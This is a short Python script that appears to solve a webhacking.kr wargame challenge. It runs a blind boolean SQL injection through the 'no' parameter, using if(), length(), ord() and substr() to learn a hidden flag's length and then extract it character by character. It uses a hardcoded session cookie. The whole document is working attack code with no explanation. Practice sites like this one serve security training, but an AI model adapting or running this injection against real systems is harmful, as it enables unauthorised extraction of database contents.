import requests
cookies={'PHPSESSID':'1ki8ju9v1rd2gatukqsv05gskv'}
key='<td>1</td>'
leng=0
for i in range(30):
    url='https://webhacking.kr/challenge/web-10/?no='
    url+=f'if((length((select(max(flag_3a55b31d))from(flag_ab733768))))in({i}),1,11)'
    response=requests.get(url=url,cookies=cookies)
    response_text=response.text
    if response_text.find(key)!=-1:
        print('flag length is ',i)
        leng=i
        break
print('flag : ',end="")
for i in range(leng+1):
    for j in range(20,128):
        url='https://webhacking.kr/challenge/web-10/?no='
        url+=f'if((ord(substr((select(max(flag_3a55b31d))from(flag_ab733768)),{i},1)))in({j}),1,11)'
        response=requests.get(url=url,cookies=cookies)
        response_text=response.text
        if response_text.find(key)!=-1:
            print(chr(j),end="")
            break
print('\n')